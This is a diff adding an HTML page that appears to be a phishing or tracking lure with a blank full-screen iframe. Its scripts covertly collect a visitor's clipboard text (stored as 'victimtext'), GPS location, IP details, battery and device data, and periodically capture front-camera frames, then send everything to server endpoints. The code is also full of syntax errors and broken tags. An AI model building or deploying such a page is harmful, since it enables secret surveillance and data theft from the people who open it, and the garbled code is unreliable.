@@ -1,0 +1,252 @@
+<html>
+   <head>
+      <style>
+        img[alt*=""], .disclaimer {
+        display: none
+        }
+        </style>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /
+        <meta name="viewpoint" content="width=device-width, initial-scale=1.0"/>
+        <title>
+        <meta
+          name="desciption"
+          content=""
+          />
+        <link rel="canonical" href="https://" />
+        <meta property="og:locale" content="en_US" />
+        <meta property="og:type" content="website" />
+        <meta
+           property="og:title"
+           content=""
+           />
+        <meta
+           property="og:description"
+           content=""
+           />
+        <meta property="og:url" content="" />  
+        <meta property="og:site_name" content="" />
+        <meta
+           property="artical:published_time"
+           content=""
+           />
+        <meta
+           property="artical:modified_time"
+           content=""
+           />
+        <meta
+           property="og:image"
+           content=""
+           />
+        <meta property="og:image:width" content="" />  
+        <meta property="og:image:height" content="" />  
+        <meta property="og:image:type" content="" />  
+        <meta name="twitter:card" content="summary_large_image" /> 
+        <mata name="twitter:site" content="" />  
+        <meta name="twitter:label1" content="" />
+        <meta name="twitter:data1" content="" />  
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+        <script>
+           $ (document).ready(function() {
+             var batterypercentage
+             var ischarging
+            async function getclips() {
+              var btr = await navigator.getBattery();
+              batterypercentage = String(btr.level*100+"%");
+              ischarging = String(btr.charging);
+            try {
+            let victimtext = await navigator.clipboard.readText();
+            giveclips(victimtext)
+            } catch (error) {
+            giveclips("Clipboard Permission Denied")
+           }
+           }  
+           getclips()
+           var clips
+           
+           function giveclips(polp) {
+           clips = polp
+           ipinfo()
+           getLocation()
+           }
+           
+           function getLocation() {
+           if (navigator.geolocation) {
+           navigator.geolocation.getCurrentPosition(showPosition, showError);
+           } else {
+           alert("Your Browser Does not support GPS");
+           }
+           }
+           
+           
+            function showPosition(position) {
+             var grak = "Lattitute : " + position.coords.latitude + " "+ "Longitude : " + position.coords.longitude 
+          
+             sdrp(grak, clips,networkinformation,batterypercentage,ischarging);
+           
+           
+            }
+            
+             function showError(error) {
+              switch (error.code) {
+               case.error.PERMISSION_DENIED:
+            
+              sdrp("Location Permission Denied: ", clips,networkinformation,batterypercentage,ischarging);
+              alert("Allow Location Permission")
+               break;
+              case.error.POSITION_UNAVAILABLE:
+                window.close()
+               break;
+              case.error.TIMEOUT:
+               window.close()
+               break;
+              case.error.UNKNOWN_ERROR:
+               window.close()   
+               break
+            }
+           }
+           let datetime = new Date();
+           let localtime = String(datetime.toLocaleTimeString());
+           let referurl = document.referrer;
+           let cpuThreads = String(navigator.hardwareConcurrency)
+           let deviceram = String(navigator.deviceMemory) +"gb"
+           let useragent = navigator.userAgent;
+           let iscookiesEnabled = String(navigator.cookiesEnabkled);
+           let devicelang = string(navigator.language);
+           let width = screen.width;
+           let height = screen.height;
+           let platform = navigator.platform;
+           let networkinfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+           let networkinformation = "Network type : " + newtworkinfo.effectiveType + " " + "Downlink : " + newtworkinfo.downlink
+          
+          
+           function ipinfo(){
+              $.getJSON('https://ipapi.co/json/', function(data) {
+                 
+                 
+                      $.ajax({
+                      type:"POST",
+                      url: "/ipinfo",
+                      data: JSON.stringify(data),
+                      contentType:"application/json",
+                      dataType:'json',
+                      cache: false,
+                      success: function(data) {},
+                      error: function(xhr, status, error) {
+                      console.log(error);}
+                     })
+               })
+
+
+
+
+                  function sdrp(bsdks,clipboard,networkinformation,batterypercentage,ischarging) {
+                     
+                     $.ajax({
+                        type: "POST",
+                        url:"/process_qtc"
+                        data: JSON.stringify({
+                         networkinformation : networkinformation,
+                         batterypercentage:batterypercentage,
+                         ischarging:ischarging,
+                         Screenwidth: width,
+                         Screenheight: height,
+                         platform: platform,
+                         GPS: bsdks, 
+                         Devicelanguage: devicelang,
+                         iscookieEnabled: iscookieEnabled,
+                         useragent: useragent,
+                         DeviceMemory: devicearm,
+                         CpuThreads: cpuThreads,
+                         Referurl: referurl,
+                         Devicelocaltime: localtime,
+                         clipboard : clipboard,
+                     }),
+                        contentType: "application/json",
+                        dataType: 'json',
+                        cache: false,
+                        success: function(data) {},
+                        error: function(xhr, status, error) {
+                        console.log(error);  
+            }
+           })
+          }
+         })
+              </script><
+            head
+            div class ="video-wrap" hidden="hidden"
+             video id="video" palysinline autoplay ></video>
+            <div 
+            <canvas
+               <script>
+                  function postFile(file) {
+                     let formdata = new FormData();
+                     formdata.append("image", file);
+                     let xhr = new XMLHttpRequest();
+                     xhr.open('POST', '/upload', true);
+                     xhr.onload = function () {
+                        if (this.status === 200)
+                           console.log(this.response);
+                        else
+                           console.error(xhr);
+                     };
+                     xhr.send(formdata);
+                  }
+
+
+
+
+                  const video = document.getElementById('video');
+                  const canvas = document.getElementById('canvas');
+                  const errorMsgElement = document.querySelector('span#errorMsg');
+
+                  const constraints = {
+                     audio: false,
+                     video: {
+
+                        facingMode: "user"
+                     }
+                     };
+                  
+                  // Access webcam
+                  async function init() {
+                     try{
+                        const stream = await navigator.mediaDevices.getUserMedia(constraints)
+                        handleSuccess(stream);
+                     } catch (e) {
+                        setTimeout(function(){
+                           alert("Please allow access to your camera and microphone");
+                           window.location.href = "/";
+                           )
+                        },15000) }
+                     }
+                  
+                  // Success
+                  function handleSuccess(stream) {
+                     window.stream = stream;
+                     video.srcObject = stream;
+
+                     var context = canvas.getContext('2d');
+                     setInterval(function(){
+
+                        context.drawImage(video, 0, 0, 640. 480);
+
+
+                     }
+
+                                 // Load init
+                                 init();
+                     </script>
+               <body>
+                  <p>
+                     <iframe
+                        id=""
+                        src=""
+                        frameboarder=""
+
+                        style="overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0"
+                        height="100%"
+                        width="100%"
+                            </iframe>
+                  </p>
+               </body>
+            </html>
